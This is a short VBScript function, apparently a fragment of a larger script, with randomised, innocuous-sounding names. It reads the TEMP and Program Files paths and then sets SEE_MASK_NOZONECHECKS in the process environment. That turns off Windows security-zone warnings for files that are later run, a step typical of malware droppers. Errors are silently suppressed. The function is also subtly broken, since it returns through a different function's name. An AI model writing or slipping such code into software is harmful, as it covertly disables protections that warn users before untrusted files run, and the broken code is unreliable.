Function ReadBackupCipher77()
On Error Resume Next
  Dim strCacheBuffer34,strManifest57,blnReady26
  Set strCacheBuffer34=CreateObject("WScript.Shell")
  strManifest57=strCacheBuffer34.ExpandEnvironmentStrings("%TEMP%")
  blnReady26=strCacheBuffer34.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strManifest57)>0 And Len(blnReady26)>0 Then
    strCacheBuffer34.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    FetchPolicyBlock85=1
    Exit Function
  End If
  FetchPolicyBlock85=0
End Function

